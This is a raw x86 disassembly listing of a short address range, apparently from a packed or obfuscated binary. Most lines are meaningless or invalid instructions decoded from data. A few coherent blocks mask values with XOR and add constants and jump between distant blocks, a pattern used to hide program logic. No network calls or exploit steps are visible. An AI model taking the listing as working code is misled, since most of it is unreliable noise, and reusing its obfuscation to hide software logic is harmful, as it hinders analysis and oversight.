  40c257:	into   
  40c258:	popa   
  40c259:	mov    ebp,0x7d30c201
  40c25e:	loopne 0x40c262
  40c260:	mov    ch,0x2c
  40c262:	pop    ss
  40c263:	test   al,0x6c
  40c265:	mov    esp,esi
  40c267:	(bad)
  40c26a:	mov    ecx,0x9875e753
  40c26f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c270:	out    0xcd,al
  40c272:	enter  0xe683,0x11
  40c276:	mov    ds:0x8d794f9a,eax
  40c27b:	leave  
  40c27c:	cs addr16 popf 
  40c27f:	or     BYTE PTR [eax+0x24],al
  40c282:	js     0x40c2aa
  40c284:	repnz or BYTE PTR [esp+edx*8],0xed
  40c289:	cmp    bl,BYTE PTR [edi]
  40c28b:	das    
  40c28c:	shl    DWORD PTR ds:0x5e5d1b4a,0x98
  40c293:	(bad)  
  40c294:	dec    ax
  40c296:	outs   dx,DWORD PTR ds:[esi]
  40c297:	mov    ebx,0x79b3ed3
  40c29c:	cmp    al,0x7c
  40c29e:	and    ch,BYTE PTR [ebx+ebx*8+0x4c525c26]
  40c2a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2a6:	lods   eax,DWORD PTR ds:[esi]
  40c2a7:	adc    esi,eax
  40c2a9:	es or  al,dl
  40c2ac:	mov    cl,0xa9
  40c2ae:	and    DWORD PTR [eax+0x5ca2ca60],esi
  40c2b4:	jmp    0x12bf1c05
  40c2b9:	xchg   edi,eax
  40c2ba:	mov    esp,0xd4a493b2
  40c2bf:	cmp    al,0xf5
  40c2c1:	xor    ebx,DWORD PTR [eax-0x4221f4b3]
  40c2c7:	and    eax,0xfc1c46d
  40c2cc:	leave  
  40c2cd:	mov    ebx,0x1e92530e
  40c2d2:	or     BYTE PTR [edi+0x2ea1e97c],bl
  40c2d8:	retf   0xdfea
  40c2db:	mov    BYTE PTR [ecx-0x524bca1b],bl
  40c2e1:	aaa    
  40c2e2:	xlat   BYTE PTR ds:[ebx]
  40c2e3:	int3   
  40c2e4:	ss inc ebp
  40c2e6:	ret    0xbc0a
  40c2e9:	not    BYTE PTR [ecx+0x263fc81b]
  40c2ef:	stc    
  40c2f0:	inc    eax
  40c2f1:	mov    WORD PTR [ecx],cs
  40c2f3:	pop    ebx
  40c2f4:	sub    eax,0x9a849b86
  40c2f9:	(bad)  
  40c2fa:	mov    edi,0xb9b299b4
  40c2ff:	icebp  
  40c300:	shr    al,0xdc
  40c303:	xor    al,0xb0
  40c305:	outs   dx,BYTE PTR ds:[esi]
  40c306:	sbb    DWORD PTR [ecx-0x23],0x7
  40c30a:	and    DWORD PTR [ebx-0x54],eax
  40c30d:	or     DWORD PTR [edi],ecx
  40c30f:	mov    dl,BYTE PTR [edi-0x5c]
  40c312:	nop
  40c313:	neg    dh
  40c315:	cdq    
  40c316:	fld    TBYTE PTR [eax+ebx*2-0x30]
  40c31a:	cs add al,0xe8
  40c31d:	push   ds
  40c31e:	mov    bl,0xdd
  40c320:	(bad)  
  40c321:	sahf   
  40c322:	push   esp
  40c323:	cmp    BYTE PTR [esi+0x4c],bl
  40c326:	mov    ds:0xeccc3751,al
  40c32b:	jo     0x40c33c
  40c32d:	and    ch,BYTE PTR [ebx-0x7aec57f]
  40c333:	add    bl,ah
  40c335:	mov    al,ds:0xa5876889
  40c33a:	mov    ecx,0x4a0f66e6
  40c33f:	push   0xffffffb2
  40c341:	fmul   DWORD PTR [esi+ebx*4]
  40c344:	inc    esp
  40c345:	test   DWORD PTR [edi],ebx
  40c347:	and    eax,DWORD PTR [eax]
  40c349:	mov    eax,0xf61ef56b
  40c34e:	inc    ecx
  40c34f:	dec    esp
  40c350:	inc    edx
  40c351:	jbe    0x40c3b1
  40c353:	gs push ebx
  40c355:	pop    ebx
  40c356:	cld    
  40c357:	mov    dh,0x25
  40c359:	sbb    al,0xa
  40c35b:	sub    ch,BYTE PTR [ebp+ecx*4+0x78b7f96]
  40c362:	add    eax,0x1856be78
  40c367:	rcl    DWORD PTR ds:0x630b7c01,cl
  40c36d:	fdivr  QWORD PTR [ecx+0x15c76ea0]
  40c373:	addr16 dec esp
  40c375:	fsub   QWORD PTR [edx]
  40c377:	pop    ds
  40c378:	aas    
  40c379:	pop    ss
  40c37a:	mov    ss,ebx
  40c37c:	data16 adc ch,BYTE PTR [ecx]
  40c37f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c380:	scas   eax,DWORD PTR es:[edi]
  40c381:	shl    DWORD PTR [ebp-0x32],cl
  40c384:	lods   al,BYTE PTR ds:[esi]
  40c385:	loopne 0x40c335
  40c387:	pop    edi
  40c388:	mov    eax,0x8c643af9
  40c38d:	int    0x31
  40c38f:	in     eax,0x27
  40c391:	(bad)  
  40c392:	sti    
  40c393:	scas   eax,DWORD PTR es:[edi]
  40c394:	xchg   esp,eax
  40c395:	sbb    al,0xf4
  40c397:	xlat   BYTE PTR ds:[ebx]
  40c398:	fwait
  40c399:	mov    bh,BYTE PTR ds:0xa180624e
  40c39f:	push   edi
  40c3a0:	xor    edx,DWORD PTR [ebx-0x1]
  40c3a3:	xor    ecx,DWORD PTR [ebx]
  40c3a5:	shl    DWORD PTR [ecx-0x36abdffd],1
  40c3ab:	xchg   esp,eax
  40c3ac:	ss push cs
  40c3ae:	dec    ebp
  40c3af:	xor    al,0x59
  40c3b1:	dec    ebp
  40c3b2:	push   edi
  40c3b3:	push   ss
  40c3b4:	dec    esi
  40c3b5:	cld    
  40c3b6:	adc    BYTE PTR [eax],dh
  40c3b8:	mov    ch,0xf5
  40c3ba:	into   
  40c3bb:	pop    eax
  40c3bc:	pop    edx
  40c3bd:	ins    BYTE PTR es:[edi],dx
  40c3be:	ret    0xccca
  40c3c1:	pop    ds
  40c3c2:	aad    0xfe
  40c3c4:	sub    BYTE PTR fs:[ebp-0x5ca4507d],0x77
  40c3cc:	jmp    0xbe30:0x8d617fa8
  40c3d3:	mov    ebp,DWORD PTR [ebp*8-0x3ffb9074]
  40c3da:	pop    es
  40c3db:	rol    DWORD PTR [edx],0xae
  40c3de:	(bad)  
  40c3df:	stos   DWORD PTR es:[edi],eax
  40c3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e1:	sahf   
  40c3e2:	add    eax,0xf2e2ec8e
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [ecx],cl
  40c447:	mov    bl,0x52
  40c449:	jecxz  0x40c45f
  40c44b:	cmp    BYTE PTR [esi+0x7e],0x38
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c490
  40c453:	jmp    0x35c0:0xa66aeb4f
  40c45a:	ds loop 0x40c49e
  40c45d:	rcl    DWORD PTR [ecx+edx*2],cl
  40c460:	pop    ss
  40c461:	jbe    0x40c3e5
  40c463:	hlt    
  40c464:	cmp    ebp,eax
  40c466:	push   edi
  40c467:	xor    eax,0x5ab7de24
  40c46c:	xchg   edx,eax
  40c46d:	repz xor BYTE PTR ds:0x9e4eaf4a,0x70
  40c475:	mov    eax,ss:0x73cf7353
  40c47b:	mov    ebp,0x64e41bcd
  40c480:	adc    DWORD PTR [esi],0xc
  40c483:	scas   eax,DWORD PTR es:[edi]
  40c484:	in     al,0xb9
  40c486:	xchg   esi,eax
  40c487:	aaa    
  40c488:	mov    bl,al
  40c48a:	xchg   BYTE PTR [ebp-0x55],cl
  40c48d:	cmc    
  40c48e:	jne    0x40c414
  40c490:	lahf   
  40c491:	stos   BYTE PTR es:[edi],al
  40c492:	call   0x7abacd57
  40c497:	in     eax,dx
  40c498:	in     eax,dx
  40c499:	bound  edx,QWORD PTR [edi-0x9]
  40c49c:	or     al,0x24
  40c49e:	ret    0xf30
  40c4a1:	pop    edi
  40c4a2:	mov    eax,0xa00675cc
  40c4a7:	mov    ch,0x9d
  40c4a9:	or     edx,DWORD PTR [ebx+eiz*2+0x2e237150]
  40c4b0:	out    dx,eax
  40c4b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4b2:	pushf  
  40c4b3:	inc    esp
  40c4b4:	das    
  40c4b5:	imul   DWORD PTR [ebx*4+0x3ee14ede]
  40c4bc:	repz xlat BYTE PTR ds:[ebx]
  40c4be:	cld    
  40c4bf:	fst    QWORD PTR [ebx+0x6712c3bf]
  40c4c5:	es retf 0x7461
  40c4c9:	dec    ebx
  40c4ca:	stos   BYTE PTR es:[edi],al
  40c4cb:	xchg   ebp,eax
  40c4cc:	(bad)
  40c4cf:	mov    cl,0xa7
  40c4d1:	ds retf 
  40c4d3:	out    0x4a,eax
  40c4d5:	push   esi
  40c4d6:	push   0x6a
  40c4d8:	aas    
  40c4d9:	cmc    
  40c4da:	mov    dl,0xe8
  40c4dc:	mov    ch,BYTE PTR [esi-0x5e626a42]
  40c4e2:	mov    DWORD PTR [ebx],eax
  40c4e4:	jmp    0xfa7f002a
  40c4e9:	cmp    ebp,ecx
  40c4eb:	rcr    BYTE PTR [esi-0x6db5da50],cl
  40c4f1:	pop    edi
  40c4f2:	xchg   esi,eax
  40c4f3:	sbb    edi,eax
  40c4f5:	mov    ecx,0x7ed85d9b
  40c4fa:	aaa    
  40c4fb:	push   ds
  40c4fc:	adc    BYTE PTR ds:0x4cc2cda6,ah
  40c502:	adc    eax,0x47d11691
  40c507:	aad    0x39
  40c509:	test   eax,0xa69fbf53
  40c50e:	pop    ss
  40c50f:	sbb    eax,0xeee4eb51
  40c514:	dec    esp
  40c515:	int3   
  40c516:	mov    BYTE PTR [eax+0x69fec5cc],cl
  40c51c:	inc    eax
  40c51d:	mov    al,ds:0x38ec6b88
  40c522:	and    DWORD PTR [ebx],ebp
  40c524:	pop    es
  40c525:	push   ds
  40c526:	repz xchg ebx,eax
  40c528:	mov    bh,BYTE PTR [esi+ebx*8+0x7c]
  40c52c:	mov    ds:0x506b295f,eax
  40c531:	(bad)  [edi]
  40c533:	cmp    BYTE PTR [esi*1-0x44439a69],0x44
  40c53b:	xchg   edi,eax
  40c53c:	inc    esi
  40c53d:	call   0x1ca5348a
  40c542:	inc    eax
  40c543:	push   ecx
  40c544:	xchg   esp,eax
  40c545:	dec    eax
  40c546:	lds    eax,FWORD PTR [eax+edi*4-0x1d]
  40c54a:	and    ah,dl
  40c54c:	pop    ds
  40c54d:	mov    ds:0xdef4199b,eax
  40c552:	ret    0xf382
  40c555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c556:	sbb    eax,0x8e317c32
  40c55b:	imul   ebx,DWORD PTR fs:[ebx+edi*2+0x36e72a28],0xffffff9e
  40c564:	push   0x134da2fe
  40c569:	shl    ecx,1
  40c56b:	je     0x40c5b6
  40c56d:	sbb    BYTE PTR [eax+0x5e],dl
  40c570:	dec    edx
  40c571:	sub    ebp,edx
  40c573:	jl     0x40c54e
  40c575:	and    BYTE PTR [eax+0x56],ch
  40c578:	(bad)  [edi]
  40c57a:	mov    ebx,DWORD PTR [edx]
  40c57c:	inc    edx
  40c57d:	scas   eax,DWORD PTR es:[edi]
  40c57e:	mov    ds:0x6c4b1b1c,eax
  40c583:	ins    DWORD PTR es:[edi],dx
  40c584:	and    DWORD PTR [ebp+0x5fb9cbe5],ecx
  40c58a:	out    dx,al
  40c58b:	jae    0x40c54c
  40c58d:	push   ebp
  40c58e:	or     DWORD PTR [eax+eax*8+0x25],esi
  40c592:	dec    ebp
  40c593:	mov    esp,0x133f660c
  40c598:	or     al,0x4d
  40c59a:	ins    DWORD PTR es:[edi],dx
  40c59b:	fistp  QWORD PTR [ebp+ecx*1+0x2502e930]
  40c5a2:	and    bl,BYTE PTR ds:0x89ce19e9
  40c5a8:	ja     0x40c52c
  40c5aa:	jecxz  0x40c59f
  40c5ac:	jne    0x40c57f
  40c5ae:	sub    dl,BYTE PTR [ebp-0x2aefcccd]
  40c5b4:	push   esp
  40c5b5:	outs   dx,DWORD PTR ds:[esi]
  40c5b6:	inc    ebp
  40c5b7:	inc    edx
  40c5b8:	mov    dh,ch
  40c5ba:	xchg   ecx,eax
  40c5bb:	adc    eax,0xf087e0e
  40c5c0:	mov    bl,BYTE PTR [ebx+esi*4-0x2b]
  40c5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5c5:	pop    ds
  40c5c6:	jg     0x40c59d
  40c5c8:	jge    0x40c624
  40c5ca:	cwde   
  40c5cb:	test   bh,al
  40c5cd:	leave  
  40c5ce:	ret    
  40c5cf:	add    al,0xa0
  40c5d1:	or     al,0x90
  40c5d3:	test   DWORD PTR [edx+0x7d],eax
  40c5d6:	les    ebp,FWORD PTR [eax]
  40c5d8:	out    0x4e,al
  40c5da:	dec    esp
  40c5db:	mov    dh,0x78
  40c5dd:	mov    esi,0x9e4c3db1
  40c5e2:	push   ds
  40c5e3:	fwait
  40c5e4:	stc    
  40c5e5:	sbb    bh,bh
  40c5e7:	leave  
  40c5e8:	je     0x40c605
  40c5ea:	pop    ebx
  40c5eb:	outs   dx,DWORD PTR ds:[esi]
  40c5ec:	or     DWORD PTR [edi-0x13],esp
  40c5ef:	pusha  
  40c5f0:	xchg   ecx,eax
  40c5f1:	jg     0x40c65c
  40c5f3:	inc    eax
  40c5f4:	mov    esi,0xed06e738
  40c5f9:	ret    0x42ae
  40c5fc:	cmp    al,0x78
  40c5fe:	cdq    
  40c5ff:	xor    bl,BYTE PTR [ebx-0x35f39d1]
  40c605:	int    0x31
  40c607:	mov    dh,0x65
  40c609:	aas    
  40c60a:	inc    esp
  40c60b:	mov    esi,0x9c85f191
  40c610:	(bad)  
  40c612:	xchg   BYTE PTR [edx+esi*2+0x55],bh
  40c616:	pop    esi
  40c617:	or     al,0x7d
  40c619:	and    BYTE PTR [ebp+0x77c6850a],0xac
  40c620:	push   0x55
  40c622:	pushf  
  40c623:	das    
  40c624:	(bad)  
  40c625:	fwait
  40c626:	lock sbb DWORD PTR [ecx+ebp*8],esi
  40c62a:	add    esp,DWORD PTR [ebx+0x5f]
  40c62d:	das    
  40c62e:	add    DWORD PTR [edx],edx
  40c630:	sbb    DWORD PTR [esi+eax*4],edi
  40c633:	cmp    al,0xad
  40c635:	push   es
  40c636:	adc    BYTE PTR [edi+0x6bc3394c],0xf5
  40c63d:	(bad)  
  40c63e:	and    BYTE PTR [eax+0x1fed2ea1],al
  40c644:	fstp   TBYTE PTR [eax]
  40c646:	xchg   ebp,eax
  40c647:	push   ds
  40c648:	enter  0xbcc,0x5a
  40c64c:	jb     0x40c698
  40c64e:	xchg   BYTE PTR [ebx+esi*2+0x2c],ah
  40c652:	sar    edx,cl
  40c654:	jecxz  0x40c67c
  40c656:	in     al,0xca
  40c658:	jns    0x40c6a5
  40c65a:	ja     0x40c661
  40c65c:	clc    
  40c65d:	jo     0x40c6bb
  40c65f:	out    dx,eax
  40c660:	dec    ebx
  40c661:	fstp   st(0)
  40c663:	xchg   ebp,eax
  40c664:	lahf   
  40c665:	test   bl,ah
  40c667:	xchg   DWORD PTR [ebx],eax
  40c669:	mov    al,0x49
  40c66b:	jg     0x40c67b
  40c66d:	scas   al,BYTE PTR es:[edi]
  40c66e:	js     0x40c61d
  40c670:	sbb    al,0x45
  40c672:	aad    0x3a
  40c674:	and    bl,BYTE PTR [ecx]
  40c676:	mov    bl,0x49
  40c678:	inc    ebp
  40c679:	xchg   DWORD PTR [ebx*1-0x640f6d76],edx
  40c680:	int3   
  40c681:	fucom  st(7)
  40c683:	repz ror BYTE PTR [eax],1
  40c686:	push   esi
  40c687:	in     eax,dx
  40c688:	fild   WORD PTR [eax+0xe452f50]
  40c68e:	xchg   esp,eax
  40c68f:	sbb    eax,0xe2ac8060
  40c694:	or     edx,DWORD PTR [ebp+0x2f]
  40c697:	jmp    0x40c657
  40c699:	fwait
  40c69a:	jb     0x40c6ce
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0xecb9ac1],dl
  40c6de:	mov    esi,DWORD PTR ds:0x7e7e80de
  40c6e4:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e9:	pop    eax
  40c6ea:	ins    DWORD PTR es:[edi],dx
  40c6eb:	les    edi,FWORD PTR [ebx+0x44]
  40c6ee:	xor    edi,DWORD PTR [edi]
  40c6f0:	push   ecx
  40c6f1:	js     0x40c756
  40c6f3:	adc    ebx,DWORD PTR [ecx+0x5161e9ef]
  40c6f9:	or     al,0xc2
  40c6fb:	(bad)
  40c6ff:	xchg   ebx,eax
  40c700:	in     eax,0xda
  40c702:	jmp    FWORD PTR [ebp+0x7c]
  40c705:	(bad)  
  40c706:	das    
  40c707:	aaa    
  40c708:	push   edi
  40c709:	push   esp
  40c70a:	jmp    0x40c715
  40c70c:	cwde   
  40c70d:	(bad)  
  40c70e:	(bad)  
  40c70f:	push   ebx
  40c710:	pop    es
  40c711:	push   cs
  40c712:	imul   esi,DWORD PTR [ecx],0xc685c82a
  40c718:	add    al,0x68
  40c71a:	jge    0x40c70c
  40c71c:	xchg   edi,eax
  40c71d:	pop    edx
  40c71e:	int3   
  40c71f:	das    
  40c720:	inc    edi
  40c721:	stos   BYTE PTR es:[edi],al
  40c722:	or     dl,BYTE PTR [edx+0x69]
  40c725:	in     al,dx
  40c726:	(bad)  
  40c727:	pushf  
  40c728:	xor    BYTE PTR [ebx],al
  40c72a:	repz lahf 
  40c72c:	retf   
  40c72d:	repz inc esi
  40c72f:	je     0x40c719
  40c731:	push   ds
  40c732:	add    al,0xf5
  40c734:	cdq    
  40c735:	xor    DWORD PTR [ebp+0x76a14def],ebx
  40c73b:	repnz xor DWORD PTR [edi],edi
  40c73e:	lea    eax,[ebp+0x12722a7b]
  40c744:	push   0xe9ba72e9
  40c749:	xor    ebp,DWORD PTR [edi-0x62b347d5]
  40c74f:	(bad)  
  40c750:	out    dx,al
  40c751:	mov    ebx,0x137c921a
  40c756:	adc    esp,DWORD PTR [esi-0x79]
  40c759:	sub    dh,cl
  40c75b:	in     eax,dx
  40c75c:	sub    BYTE PTR [edx+0x64221288],ah
  40c762:	aaa    
  40c763:	inc    esi
  40c764:	rol    ch,cl
  40c766:	mov    cl,0x5d
  40c768:	cld    
  40c769:	ja     0x40c6ed
  40c76b:	fsub   st(0),st
  40c76d:	and    esi,edi
  40c76f:	cmp    dh,BYTE PTR [esi+0x5f]
  40c772:	xlat   BYTE PTR ds:[ebx]
  40c773:	jmp    0x4d5f:0xcb894a2d
  40c77a:	fsubr  DWORD PTR [eax]
  40c77c:	lahf   
  40c77d:	xchg   ebx,eax
  40c77e:	repz pop esi
  40c780:	popf   
  40c781:	outs   dx,BYTE PTR ds:[esi]
  40c782:	xor    DWORD PTR [eax],esi
  40c784:	xor    DWORD PTR [eax],eax
  40c786:	jo     0x40c762
  40c788:	ins    DWORD PTR es:[edi],dx
  40c789:	cmp    esi,edi
  40c78b:	cs loopne 0x40c717
  40c78e:	rcr    DWORD PTR [ecx-0x64ff34c9],0x82
  40c795:	lods   eax,DWORD PTR ds:[esi]
  40c796:	sbb    DWORD PTR [esi-0x5],0xffffff9c
  40c79a:	test   eax,0xbf3df8fd
  40c79f:	ss ja  0x40c803
  40c7a2:	std    
  40c7a3:	fisub  DWORD PTR [ebp+0x953c4fa]
  40c7a9:	stos   DWORD PTR es:[edi],eax
  40c7aa:	cmc    
  40c7ab:	cld    
  40c7ac:	sbb    eax,0x2c61a20c
  40c7b1:	and    dl,BYTE PTR [ebx+0x658a62d2]
  40c7b7:	test   DWORD PTR [ebx+0x1725e1ea],edx
  40c7bd:	fisub  WORD PTR [ecx]
  40c7bf:	dec    esi
  40c7c0:	jle    0x40c748
  40c7c2:	inc    esi
  40c7c3:	adc    al,al
  40c7c5:	test   eax,0x5f02e3ab
  40c7ca:	sub    ebp,edi
  40c7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7cd:	and    DWORD PTR [ebp-0x55],esi
  40c7d0:	add    al,0x93
  40c7d2:	sub    ebx,DWORD PTR [ebp+edi*1+0x4c]
  40c7d6:	cmp    ch,BYTE PTR [ebx+eax*4+0x195b84e2]
  40c7dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7de:	add    BYTE PTR [ebp-0x3555b335],bh
  40c7e4:	ss das 
  40c7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7e7:	sub    BYTE PTR [edx],al
  40c7e9:	ret    0x7f1f
  40c7ec:	repnz int 0x60
  40c7ef:	pop    ss
  40c7f0:	mov    bh,0x67
  40c7f2:	pushf  
  40c7f3:	push   esp
  40c7f4:	out    dx,eax
  40c7f5:	scas   al,BYTE PTR es:[edi]
  40c7f6:	out    dx,eax
  40c7f7:	rcr    DWORD PTR [eax-0x42],cl
  40c7fa:	or     al,0x8d
  40c7fc:	push   ds
  40c7fd:	fild   WORD PTR [edi]
  40c7ff:	or     al,0xa1
  40c801:	xchg   edx,eax
  40c802:	add    BYTE PTR [ecx-0x5675c35f],cl
  40c808:	lock js 0x40c7a2
  40c80b:	popf   
  40c80c:	push   esp
  40c80d:	fldcw  WORD PTR ds:0x33e46cdd
  40c813:	vhaddps ymm1,ymm3,YMMWORD PTR [ecx+0x66ea6a7]
  40c81b:	inc    ecx
  40c81d:	xchg   BYTE PTR [edx],dl
  40c81f:	sub    DWORD PTR [ebp+0x6fa24d6d],esp
  40c825:	jno    0x40c815
  40c827:	shr    BYTE PTR [ebp+ebp*2+0x35],1
  40c82b:	loopne 0x40c876
  40c82d:	mov    esi,0x99ba31fb
  40c832:	sbb    DWORD PTR [edi-0x5a088bf4],esi
  40c838:	or     DWORD PTR [ebp-0x77bcc5d0],ecx
  40c83e:	sbb    edx,DWORD PTR [ebx+0x5541d371]
  40c844:	outs   dx,BYTE PTR ds:[esi]
  40c845:	fisttp DWORD PTR ss:[esi]
  40c848:	jbe    0x40c820
  40c84a:	(bad)  
  40c84b:	adc    al,0x45
  40c84d:	xchg   ecx,eax
  40c84e:	imul   BYTE PTR ds:0x5f4d1849
  40c854:	mov    ds:0x83f8cf7f,eax
  40c859:	push   edx
  40c85a:	or     al,0xac
  40c85c:	sub    al,0x3e
  40c85e:	ins    DWORD PTR es:[edi],dx
  40c85f:	jmp    0x40c848
  40c861:	pop    esi
  40c862:	add    eax,ecx
  40c864:	jg     0x40c803
  40c866:	mov    al,0x25
  40c868:	aas    
  40c869:	adc    bh,BYTE PTR [ecx+0x6937740a]
  40c86f:	cmp    ebp,edi
  40c871:	push   es
  40c872:	stc    
  40c873:	lods   al,BYTE PTR ds:[esi]
  40c874:	popf   
  40c875:	rcl    DWORD PTR [edx],cl
  40c877:	cmp    bl,BYTE PTR [edx-0x3c1c25a3]
  40c87d:	add    al,0x99
  40c87f:	push   0x4d
  40c881:	fsubr  DWORD PTR [eax]
  40c883:	pop    esp
  40c884:	enter  0x66eb,0xc4
  40c888:	rol    BYTE PTR [ebp+0x36ba894a],0xdb
  40c88f:	mov    ch,0xe6
  40c891:	gs nop
  40c893:	loopne 0x40c8fe
  40c895:	fucomp st(1)
  40c897:	pop    edx
  40c898:	fs jp  0x40c8ad
  40c89b:	mov    eax,0xd1e6afad
  40c8a0:	xchg   esi,eax
  40c8a1:	lods   eax,DWORD PTR ds:[esi]
  40c8a2:	push   es
  40c8a3:	mov    edx,0xa4b4b5d
  40c8a8:	sbb    BYTE PTR [edx],dl
  40c8aa:	lds    ecx,FWORD PTR [edx+0x6d]
  40c8ad:	test   DWORD PTR [eax-0x4f],esi
  40c8b0:	push   cs
  40c8b1:	fsubp  st(6),st
  40c8b3:	leave  
  40c8b4:	stc    
  40c8b5:	and    DWORD PTR [esi-0x40],0xfffffff5
  40c8b9:	imul   esp,DWORD PTR [ecx+0x62fb940c],0x19a4a02c
  40c8c3:	aam    0xd7
  40c8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8c6:	rcl    DWORD PTR [edx+0x5e],1
  40c8c9:	adc    BYTE PTR [edi+ecx*8],ch
  40c8cc:	lock (bad) 
  40c8ce:	jne    0x40c8e3
  40c8d0:	ror    BYTE PTR [ecx+0x46f5ce96],0xa6
  40c8d7:	in     eax,0x87
  40c8d9:	inc    esp
  40c8da:	cmp    BYTE PTR [ebx+0x2b],dh
  40c8dd:	addr16 into 
  40c8df:	shr    ebx,1
  40c8e1:	mov    ch,0x48
  40c8e3:	add    al,0x22
  40c8e5:	jb     0x40c878
  40c8e7:	int    0x97
  40c8e9:	sub    BYTE PTR [eax-0x195beb2d],bh
  40c8ef:	cld    
  40c8f0:	into   
  40c8f1:	pop    eax
  40c8f2:	les    esp,FWORD PTR fs:[edi-0xb]
  40c8f6:	arpl   bx,di
  40c8f8:	in     al,dx
  40c8f9:	icebp  
  40c8fa:	dec    edi
  40c8fb:	imul   edi,DWORD PTR ds:0x93a1a985,0xa
  40c903:	jg     0x40c887
  40c905:	dec    esp
  40c906:	rcr    BYTE PTR [edx+0x7c47a30b],cl
  40c90c:	jge    0x40c91d
  40c90e:	into   
  40c90f:	mov    ah,0x64
  40c911:	in     eax,0x2f
  40c913:	inc    edx
  40c914:	xchg   ecx,eax
  40c915:	mov    edx,0xbf5f3f4
  40c91a:	xchg   BYTE PTR [eax+0x56],dl
  40c91d:	repz push ebx
  40c91f:	sbb    al,0xca
  40c921:	mov    esi,0xc946fbca
  40c926:	mov    BYTE PTR [edi+0x5e],bh
  40c929:	fld    TBYTE PTR [ebx]
  40c92b:	sahf   
  40c92c:	xchg   DWORD PTR [edx],ebx
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [esi-0x67c7d260],ebp
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	jecxz  0x40c9b6
  40c952:	fiadd  DWORD PTR [edx+0x62]
  40c955:	pop    esi
  40c956:	xchg   esp,eax
  40c957:	lods   al,BYTE PTR ds:[esi]
  40c958:	into   
  40c959:	or     BYTE PTR [edi+ebp*1+0x421ee36a],0xab
  40c961:	rol    esi,cl
  40c963:	nop
  40c964:	leave  
  40c965:	(bad)  
  40c967:	fcomip st,st(3)
  40c969:	js     0x40c918
  40c96b:	dec    eax
  40c96c:	mov    al,ds:0x16705405
  40c971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c972:	push   edi
  40c973:	push   ebx
  40c974:	push   edx
  40c975:	sbb    al,0x59
  40c977:	ss sub eax,0x98ff4b8b
  40c97d:	mov    ch,0x9d
  40c97f:	inc    esp
  40c980:	test   BYTE PTR [eax],cl
  40c982:	das    
  40c983:	push   ecx
  40c984:	adc    edx,DWORD PTR [edx-0x21]
  40c987:	pop    eax
  40c988:	push   0x65
  40c98a:	xchg   ebx,eax
  40c98b:	test   BYTE PTR [edx-0x77],ch
  40c98e:	push   ds
  40c98f:	xor    eax,0x4456a1bc
  40c994:	aas    
  40c995:	or     DWORD PTR [ebp-0x38],edi
  40c998:	fimul  WORD PTR [esi+0x36076280]
  40c99e:	shr    BYTE PTR [esi-0x2],1
  40c9a1:	or     al,0xba
  40c9a3:	stc    
  40c9a4:	inc    edi
  40c9a5:	das    
  40c9a6:	out    0x2b,al
  40c9a8:	pop    esp
  40c9a9:	pushf  
